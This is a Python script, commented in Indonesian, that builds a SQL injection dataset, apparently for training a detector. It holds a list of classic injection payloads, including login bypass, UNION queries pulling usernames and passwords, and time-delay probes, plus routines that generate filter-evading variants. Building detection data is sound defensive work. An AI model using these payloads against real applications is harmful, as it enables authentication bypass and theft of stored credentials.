import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
import json
import os

class SQLIDatasetGenerator:
    def __init__(self):
        # Contoh payload SQL Injection dasar (untuk pembelajaran)
        self.basic_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' GROUP BY 1--",
            "' HAVING 1=1--",
            "' HAVING 'x'='x",
            "' AND 1=1--",
            "' AND 1=2--",
            "' WAITFOR DELAY '0:0:5'--",
            "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "') OR '1'='1",
            "admin') OR ('1'='1",
            "' OR '1'='1' /*",
            "' OR '1'='1' ({",
            "' OR 1=1 LIMIT 1--",
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "' OR username LIKE '%admin%",
            "' OR userid LIKE '%1%",
            "' GROUP BY columnnames having 1=1--",
            "' UNION ALL SELECT 1,2,3--",
            "' UNION ALL SELECT system_user(),user(),database()--",
            "' AND 1 in (SELECT TOP 1 table_name FROM INFORMATION_SCHEMA.TABLES)--"
        ]

    def generate_variations(self, payload):
        """Menghasilkan variasi dari payload dasar"""
        variations = []
        variations.append(payload)
        variations.append(payload.upper())
        variations.append(payload.replace("'", '"'))
        variations.append(payload.replace(" ", "/**/"))
        variations.append(payload.replace(" ", "+"))
        variations.append(payload.replace(" ", "%20"))
        variations.append(payload.replace("OR", "||"))
        variations.append(payload.replace("AND", "&&"))
        return variations

    def generate_dataset(self, output_dir="sqli_data"):
        """Menghasilkan dataset lengkap dengan variasi"""
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        all_payloads = []
        for payload in self.basic_payloads:
            variations = self.generate_variations(payload)
            all_payloads.extend(variations)

        # Konversi ke array numpy
        payloads_array = np.array(all_payloads)

        # Generate TF-IDF features
        vectorizer = TfidfVectorizer(
            analyzer='char',
            ngram_range=(1, 4),
            min_df=0.1,
            max_df=0.9
        )
        tfidf_features = vectorizer.fit_transform(all_payloads).toarray()

        # Simpan dataset dan features
        np.save(os.path.join(output_dir, 'sqli_dataset.npy'), payloads_array)
        np.save(os.path.join(output_dir, 'tfidf_features.npy'), tfidf_features)

        # Simpan metadata
        metadata = {
            'num_samples': len(all_payloads),
            'feature_dim': tfidf_features.shape[1],
            'vectorizer_vocab': len(vectorizer.vocabulary_),
            'basic_patterns': len(self.basic_payloads),
            'total_variations': len(all_payloads)
        }

        with open(os.path.join(output_dir, 'dataset_metadata.json'), 'w') as f:
            json.dump(metadata, f, indent=4)

        return metadata

if __name__ == "__main__":
    # Buat instance generator
    generator = SQLIDatasetGenerator()
    
    # Generate dataset
    metadata = generator.generate_dataset()
    
    print("\nDataset telah berhasil dibuat!")
    print(f"Jumlah total payload: {metadata['num_samples']}")
    print(f"Dimensi feature vector: {metadata['feature_dim']}")
    print(f"Jumlah pola dasar: {metadata['basic_patterns']}")
    print(f"Total variasi: {metadata['total_variations']}")
    print("\nFiles yang dihasilkan:")
    print("- sqli_data/sqli_dataset.npy")
    print("- sqli_data/tfidf_features.npy")
    print("- sqli_data/dataset_metadata.json")
